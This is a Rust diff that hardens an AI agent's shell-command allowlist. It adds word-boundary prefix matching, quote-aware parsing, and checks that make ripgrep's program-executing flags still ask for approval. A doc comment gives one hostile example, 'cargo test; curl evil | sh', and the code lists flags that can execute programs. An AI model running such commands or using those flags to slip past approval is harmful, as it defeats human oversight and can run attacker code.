@@ -34,9 +34,15 @@
 // timeout_secs = 300
 // ```
 //
-// * `allow_commands` entries are **prefix** matches on the exact command string:
-//   `"git status"` allows `git status -s` but not `git push`. They only affect the
-//   `ask`/`ask_commands` prompt; they do not exist in `read_only`.
+// * `allow_commands` entries are **prefix** matches at command-word boundaries:
+//   `"git status"` allows `git status -s` but not `git push` or `git statusish`;
+//   `"rg"` allows both bare `rg` and `rg TODO src`, but never `rgx`. They only
+//   affect the `ask`/`ask_commands` prompt; they do not exist in `read_only`.
+// * An allowlist match does not bypass execution-specific option checks. For
+//   `rg`, `--pre`, `--pre-glob` and `--hostname-bin` still
+//   prompt, including their `--flag=value` spellings. This is not a complete
+//   list of commands that can execute code (`cargo test` runs build scripts), so
+//   keep the allowlist narrow and use a sandbox for untrusted work.
 // * `auto_approve_paths` are workspace-relative prefixes for writes and edits.
 // * `timeout_secs` bounds one approval. An unanswered approval expires and the
 //   action is treated as denied.
@@ -159,6 +165,80 @@ fn has_shell_control(command: &str) -> bool {
     command.chars().any(|c| SHELL_CONTROL.contains(&c))
 }
 
+/// Match a command prefix only where the shell would finish a word. In
+/// particular, `rg` must not lend its approval to an executable named `rgx`.
+fn has_allowlist_prefix(command: &str, prefix: &str) -> bool {
+    let prefix = prefix.trim();
+    if prefix.is_empty() {
+        return false;
+    }
+    let Some(remainder) = command.strip_prefix(prefix) else {
+        return false;
+    };
+    remainder.is_empty() || remainder.starts_with([' ', '\t'])
+}
+
+/// Split the quote/whitespace subset that remains after shell control characters
+/// have been rejected. Quotes are removed and adjacent quoted/unquoted fragments
+/// are concatenated, as the shell does, so `"--pre"` and `--p''re` cannot disguise
+/// an execution flag. Backslash and substitution syntax never reach this helper.
+fn shell_words(command: &str) -> Option<Vec<String>> {
+    let mut words = Vec::new();
+    let mut word = String::new();
+    let mut in_word = false;
+    let mut quote = None;
+    for c in command.chars() {
+        if let Some(delimiter) = quote {
+            if c == delimiter {
+                quote = None;
+            } else {
+                word.push(c);
+            }
+            continue;
+        }
+        match c {
+            ' ' | '\t' if in_word => {
+                words.push(std::mem::take(&mut word));
+                in_word = false;
+            }
+            ' ' | '\t' => {}
+            '\'' | '"' => {
+                quote = Some(c);
+                in_word = true;
+            }
+            _ => {
+                word.push(c);
+                in_word = true;
+            }
+        }
+    }
+    if quote.is_some() {
+        return None;
+    }
+    if in_word {
+        words.push(word);
+    }
+    Some(words)
+}
+
+/// Ripgrep options which run or select another executable. They are not search
+/// options: the presence of the ordinary `rg` allowlist entry cannot suppress
+/// the human decision to run those programs.
+fn has_rg_execution_flag(command: &str) -> bool {
+    let Some(words) = shell_words(command) else {
+        return true;
+    };
+    let is_rg = words
+        .first()
+        .and_then(|executable| executable.rsplit('/').next())
+        .is_some_and(|executable| executable == "rg");
+    is_rg
+        && words.iter().skip(1).any(|word| {
+            let flag = word.split_once('=').map_or(word.as_str(), |(flag, _)| flag);
+            matches!(flag, "--pre" | "--pre-glob" | "--hostname-bin")
+        })
+}
+
 #[derive(Debug, Clone)]
 pub struct ApprovalPolicyView {
     pub mode: ApprovalMode,
@@ -170,8 +250,8 @@ impl ApprovalPolicyView {
     /// What to do with a shell command without asking the user.
     ///
     /// **This allowlist is a convenience, not a safety boundary.** It only
-    /// suppresses the prompt for commands that are literally a prefix match and
-    /// contain no shell control or metacharacter context. An entry like
+    /// suppresses the prompt for commands with a prefix ending at a command-word
+    /// boundary and no shell control or metacharacter context. An entry like
     /// `cargo test` must never auto-approve `cargo test; curl evil | sh`, and a
     /// prefix match is never a substitute for a sandbox: `cargo test` itself
     /// runs arbitrary build scripts, so the user (and `auto` mode) still decide
@@ -181,7 +261,9 @@ impl ApprovalPolicyView {
     /// newline/carriage return returns [`AutoDecision::Ask`] even when it starts
     /// with an allowlisted prefix, because those characters start a second
     /// command, a substitution, a subshell or a redirection. The whole command
-    /// is checked (which also covers the matched remainder).
+    /// is checked (which also covers the matched remainder). An allowlisted `rg`
+    /// invocation also asks when it contains `--pre`, `--pre-glob` or
+    /// `--hostname-bin`, because those options execute or select another program.
     pub fn for_shell(&self, command: &str) -> AutoDecision {
         match self.mode {
             ApprovalMode::Auto => AutoDecision::Allow,
@@ -191,14 +273,17 @@ impl ApprovalPolicyView {
                     return AutoDecision::Ask;
                 }
                 let cmd = command.trim_start();
-                if self
+                if !self
                     .allow_commands
                     .iter()
-                    .any(|p| !p.is_empty() && cmd.starts_with(p.as_str()))
+                    .any(|prefix| has_allowlist_prefix(cmd, prefix))
                 {
-                    AutoDecision::Allow
-                } else {
+                    return AutoDecision::Ask;
+                }
+                if has_rg_execution_flag(cmd) {
                     AutoDecision::Ask
+                } else {
+                    AutoDecision::Allow
                 }
             }
         }
@@ -299,12 +384,40 @@ mod tests {
 
     #[test]
     fn allowlist_still_auto_allows_plain_prefixes() {
-        let v = view(ApprovalMode::AskCommands, &["cargo test", "rg "]);
+        let v = view(ApprovalMode::AskCommands, &["cargo test", "rg"]);
         assert_eq!(v.for_shell("cargo test --all"), AutoDecision::Allow);
         assert_eq!(v.for_shell("  cargo test"), AutoDecision::Allow);
+        assert_eq!(v.for_shell("rg"), AutoDecision::Allow);
         assert_eq!(v.for_shell("rg TODO src"), AutoDecision::Allow);
         assert_eq!(v.for_shell("rgx TODO"), AutoDecision::Ask);
+        assert_eq!(v.for_shell("cargo testing"), AutoDecision::Ask);
         assert_eq!(v.for_shell("cargo build"), AutoDecision::Ask);
+    }
+
+    #[test]
+    fn allowlisted_rg_cannot_delegate_execution_without_asking() {
+        let v = view(ApprovalMode::AskCommands, &["rg", "/usr/bin/rg"]);
+        for command in [
+            "rg --pre cat TODO src",
+            "rg --pre=cat TODO src",
+            "rg --pre-glob '*.md' TODO src",
+            "rg --pre-glob=*.md TODO src",
+            "rg --hostname-bin /bin/echo TODO src",
+            "rg --hostname-bin=/bin/echo TODO src",
+            "rg \"--pre\" cat TODO src",
+            "rg --p''re=cat TODO src",
+            "/usr/bin/rg --pre cat TODO src",
+        ] {
+            assert_eq!(
+                v.for_shell(command),
+                AutoDecision::Ask,
+                "{command:?} selects command execution and must ask"
+            );
+        }
+        assert_eq!(
+            v.for_shell("rg --fixed-strings TODO src"),
+            AutoDecision::Allow
+        );
     }
 
     #[test]
